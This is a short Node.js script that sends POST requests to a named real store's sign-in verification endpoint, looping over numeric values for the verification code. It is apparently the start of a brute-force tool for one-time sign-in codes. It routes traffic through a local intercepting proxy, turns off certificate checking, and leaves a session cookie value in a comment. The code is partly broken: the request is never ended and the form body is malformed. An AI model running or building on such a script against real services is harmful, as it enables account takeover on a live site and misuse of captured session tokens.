
const https = require('https')
const axios = require('axios')

function consoleTheResult(num) {
 
    // axios.cookie('_orders_web_session=T2ZTalBPL05mU2NlL2V0K29ncDZWdWorRkNDVCtRUFJFVFRxN1NqQllPY0d5cmxKVmp6K1Y0MGhleUdWN1dKZDBWY2FsK1Uxb2RPL3ZNYU55SHp3ckE9PS0tcDZYQktHVWlrWWNJTWNsdDM4NFQwZz09--1d906271890a94511abc1136267a15cc99ab032a')
const req = https.request({ 
    host: 'mystore.mrsool.co', 
    port: 443,
    path: '/verify_signin',
    method: 'POST',
    rejectUnauthorized: false,
    requestCert: false,
    agent: false,
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
    }
  }, (res)=>{
      console.log(res)
})
req.write('vVerificationCode:2343')
//axios.defaults.baseURL = 'https://mystore.mrsool.co';
const options = {
    proxy:{
                protocol:'http',
                host:'127.0.0.1',
                port:8080
            },
     httpsAgent : new https.Agent({
                rejectUnauthorized: false,
              })
}
const params = new URLSearchParams();
params.append('vVerificationCode', num);
//axios.post('https://mystore.mrsool.co/verify_signin',params,options)
    // const x = axios({
    //     method:'POST',
    //     url:'/verify_signin',
    //     proxy:{
    //         protocol:'http',
    //         host:'127.0.0.1',
    //         port:8080
    //     },
    //     headers: { 'content-type': 'application/x-www-form-urlencoded' },

    //     data: {
    //         vVerificationCode:num
    //     },
    //     maxRedirects: 1, // default

    // })
    // .then(e =>{
    //     console.log()
    // })
    // axios.post('https://mystore.mrsool.co/verify_signin',{
    //     vVerificationCode:num
    // },(err, req, body) =>{
    //     console.log(body)
    // })
    // request.post('https://mystore.mrsool.co/verify_signin', {form:
    // {vVerificationCode:num}}, (err, req, body)=>{
    //     console.log(body)
    
    // })

   
}

for (var i = 1000; i <1001; i++) {
    consoleTheResult(i)
}